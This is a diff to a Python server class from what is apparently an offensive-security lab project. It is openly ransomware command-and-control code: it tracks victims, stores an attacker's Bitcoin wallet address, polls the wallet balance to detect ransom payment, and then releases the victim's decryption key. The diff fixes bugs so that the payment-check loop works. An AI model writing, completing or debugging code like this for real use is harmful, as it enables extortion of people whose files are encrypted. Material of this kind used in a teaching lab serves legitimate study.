@@ -26,6 +26,8 @@ class Server:
     VICTIMS = []
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
+
+    global initial_balance, WALLET_ADDRESS, bitcoin_needed 
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
     initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
     bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed
@@ -118,7 +120,7 @@ class Server:
     #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
     def check_if_user_paid(self):
         
-        current_balance =  cryptowallet.get_balance(wallet_address)
+        current_balance =  cryptowallet.get_balance(WALLET_ADDRESS)
 
         amount_paid = current_balance - initial_balance 
         
@@ -174,7 +176,7 @@ class Server:
 
                     
                 while (True):
-                    if(check_if_user_paid):
+                    if(self.check_if_user_paid()):
                         # sends decryption key  
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
